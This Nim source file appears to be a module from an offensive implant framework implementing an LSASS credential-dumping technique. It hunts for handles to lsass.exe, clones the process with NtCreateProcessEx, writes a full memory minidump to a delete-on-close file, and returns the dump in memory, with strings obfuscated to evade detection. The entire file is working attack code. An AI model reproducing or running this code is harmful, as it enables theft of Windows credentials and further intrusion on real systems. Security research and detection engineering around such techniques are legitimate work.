import winim
import nimprotect
import ../helpers
import std/[strutils, dynlib, tables, net]

type
    NtQuerySystemInformation_t = proc(SystemInformationClass: ULONG, SystemInformation: PVOID, SystemInformationLength: ULONG, ReturnLength: PULONG): NTSTATUS {.stdcall.}
    NtDuplicateObject_t = proc(SourceProcessHandle: HANDLE, SourceHandle: HANDLE, TargetProcessHandle: HANDLE, TargetHandle: PHANDLE, DesiredAccess: ACCESS_MASK, HandleAttributes: ULONG, Options: ULONG): NTSTATUS {.stdcall.}
    NtCreateProcessEx_t = proc(ProcessHandle: PHANDLE, DesiredAccess: ACCESS_MASK, ObjectAttributes: POBJECT_ATTRIBUTES, ParentProcess: HANDLE, Flags: ULONG, SectionHandle: HANDLE, DebugPort: HANDLE, ExceptionPort: HANDLE, InJob: BOOLEAN): NTSTATUS {.stdcall.}
    NtGetNextProcess_t = proc(ProcessHandle: HANDLE, DesiredAccess: ACCESS_MASK, HandleAttributes: ULONG, Flags: ULONG, NewProcessHandle: PHANDLE): NTSTATUS {.stdcall.}

{.emit: protectString("char procName[4096];").}
var procName {.importc, nodecl.}: cstring

proc enumLsassHandles(): seq[(ULONG, HANDLE)] =
    var status: NTSTATUS
    var ntdll = loadLib(protectString("ntdll.dll"))
    var 
        NtQuerySystemInformation = cast[NtQuerySystemInformation_t](ntdll.symAddr(protectString("NtQuerySystemInformation")))
        NtDuplicateObject = cast[NtDuplicateObject_t](ntdll.symAddr(protectString("NtDuplicateObject")))

    var lsassHandles: seq[(ULONG, HANDLE)] = @[]
    var handleInfo = initTable[ULONG, seq[USHORT]]() #Key = PID, Value = Seq[HANDLE]
    var dupHandle: HANDLE

    var rtrnLength: ULONG = 0
    var shiBuffer = VirtualAlloc(NULL, sizeof(SYSTEM_HANDLE_INFORMATION), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
   
    status = NtQuerySystemInformation(0x10, cast[PSYSTEM_HANDLE_INFORMATION](shiBuffer), cast[ULONG](sizeof(SYSTEM_HANDLE_INFORMATION)), addr rtrnLength)
    while status == STATUS_INFO_LENGTH_MISMATCH: 
        VirtualFree(shiBuffer, 0, MEM_RELEASE)
        shiBuffer = VirtualAlloc(NULL, rtrnLength, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
        status = NtQuerySystemInformation(0x10, cast[PSYSTEM_HANDLE_INFORMATION](shiBuffer), rtrnLength, addr rtrnLength)
    
    if NT_SUCCESS(status) != true:
        return @[]

    var shiEnd = shiBuffer + rtrnLength
    var sHandle = shiBuffer + sizeof(LONG)

    while cast[int](sHandle) <= cast[int](shiEnd):
        sHandle = sHandle + sizeof(LONG)
        var sysHandle = cast[PSYSTEM_HANDLE_INFORMATION](sHandle).Handle[0]
        if not handleInfo.hasKey(sysHandle.OwnerPid) and (sysHandle.ObjectType != 0 and sysHandle.HandleFlags != 0 and (sysHandle.HandleValue != 0 and sysHandle.HandleValue != 65535)):
            handleInfo[sysHandle.OwnerPid] = @[]
            handleInfo[sysHandle.OwnerPid].add(sysHandle.HandleValue)

    for pid in handleInfo.keys:

        if pid == 4:
            continue
        
        for syshandle in handleInfo[pid]:
            var pHandle: HANDLE = OpenProcess(PROCESS_DUP_HANDLE, FALSE, cast[DWORD](pid))

            if GetLastError() != 0:
                continue

            status = NtDuplicateObject(pHandle, cast[HANDLE](syshandle), cast[HANDLE](-1), addr dupHandle, PROCESS_CREATE_PROCESS, 0, 0)
            if NT_SUCCESS(status) != true:
                continue

            var oinfo: OBJECT_TYPE_INFORMATION
            var oinfoBuffer = VirtualAlloc(NULL, sizeof(OBJECT_TYPE_INFORMATION), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
            var ortrnLength: ULONG

            status = NtQueryObject(dupHandle, cast[OBJECT_INFORMATION_CLASS](2), oinfoBuffer, cast[ULONG](sizeof(OBJECT_TYPE_INFORMATION)), addr ortrnLength)
            
            while status == STATUS_INFO_LENGTH_MISMATCH: 
                VirtualFree(oinfoBuffer, 0, MEM_RELEASE)
                oinfoBuffer = VirtualAlloc(NULL, ortrnLength, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
                status = NtQueryObject(dupHandle, cast[OBJECT_INFORMATION_CLASS](2), oinfoBuffer, ortrnLength, addr ortrnLength)

            if NT_SUCCESS(status) != true:
                return @[]

            oinfo = cast[OBJECT_TYPE_INFORMATION](oinfoBuffer)
            var pname: cstring
            var pname_size: DWORD = 4096
            var oinfoTypeNameBufferValuePtr = oinfoBuffer+0x68
            var oinfoTypeNameBufferValue = cast[PWSTR](oinfoTypeNameBufferValuePtr)

            if $oinfoTypeNameBufferValue == protectString("Process"):
                if QueryFullProcessImageNameW(dupHandle, 0, pname, addr pname_size) != 0:
                    if cmpIgnoreCase(winim.winstr.`$`pname, protectString("lsass.exe")) == 0:
                        lsassHandles.add((pid, dupHandle))
                    else:
                        CloseHandle(cast[HANDLE](syshandle))
                        CloseHandle(dupHandle)
                else:
                    return @[]

    VirtualFree(shiBuffer, 0, MEM_RELEASE)
    return lsassHandles


proc evil_lsass_twin*(): string =
    var hNtdll = loadLib(protectString("ntdll.dll"))
    var status: NTSTATUS
    var procOA: OBJECT_ATTRIBUTES

    InitializeObjectAttributes(addr procOA, NULL, 0, cast[HANDLE](NULL), NULL)

    var 
        NtCreateProcessEx = cast[NtCreateProcessEx_t](hNtdll.symAddr(protectString("NtCreateProcessEx")))
        NtGetNextProcess = cast[NtGetNextProcess_t](hNtdll.symAddr(protectString("NtGetNextProcess")))
    
    var dupHandlesSeq = enumLsassHandles()
    var victimHandle: HANDLE = cast[HANDLE](NULL)
    var pid: DWORD
    var count: int = 1

    if dupHandlesSeq.len == 0:

        while NtGetNextProcess(victimHandle, MAXIMUM_ALLOWED, 0, 0, addr victimHandle) == 0:
            count += 1

            if GetProcessImageFileNameA(victimHandle, procName, MAX_PATH) == 0:
                return ""

            if lstrcmpiA(protectString("lsass.exe"), PathFindFileNameA(procName)) == 0:
                pid = GetProcessId(victimHandle)
                break
        
        if victimHandle == 0:
            return ""
        else:
            dupHandlesSeq.add((pid, victimHandle))

    for handleTuple in dupHandlesSeq:
        status = NtCreateProcessEx(addr victimHandle, PROCESS_ALL_ACCESS, addr procOA, handleTuple[1], cast[ULONG](0), cast[HANDLE](NULL), cast[HANDLE](NULL), cast[HANDLE](NULL), FALSE)
        if NT_SUCCESS(status):
            break

    if NT_SUCCESS(status) == false:
        return ""

    var IoStatusBlock: IO_STATUS_BLOCK
    var fileDI: FILE_DISPOSITION_INFORMATION
    fileDI.DoDeleteFile = TRUE

    var outFile = CreateFile(protectString("twin.txt"), GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, cast[HANDLE](NULL))

    if outFile == INVALID_HANDLE_VALUE:
        TerminateProcess(victimHandle, 0)
        CloseHandle(victimHandle)
        CloseHandle(outFile)
        return ""

    status = NtSetInformationFile(outFile, addr IoStatusBlock, addr fileDI, cast[ULONG](sizeof(fileDI)), 13)
    
    if NT_SUCCESS(status) == false:
        return ""
    
    var miniDump = MiniDumpWriteDump(victimHandle, 0, outFile, 0x00000002, NULL, NULL, NULL)
    if miniDump == TRUE:
        TerminateProcess(victimHandle, 0)
    else: 
        TerminateProcess(victimHandle, 0)
        CloseHandle(outFile)
    
    if miniDump == FALSE:
        return ""

    var size: DWORD = GetFileSize(outFile, NULL)
    var hMapping: HANDLE = CreateFileMapping(outFile, NULL, PAGE_READONLY, 0, 0, "")
    var mappedData = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0)

    var dataCstring = cast[cstring](mappedData)
    var dataString = ""

    for i in countup(0, size):
        dataString.add(dataCstring[i])

    UnmapViewOfFile(mappedData)
    for handleTuple in dupHandlesSeq: CloseHandle(handleTuple[1])
    CloseHandle(outFile)
    CloseHandle(hMapping)

    return dataString

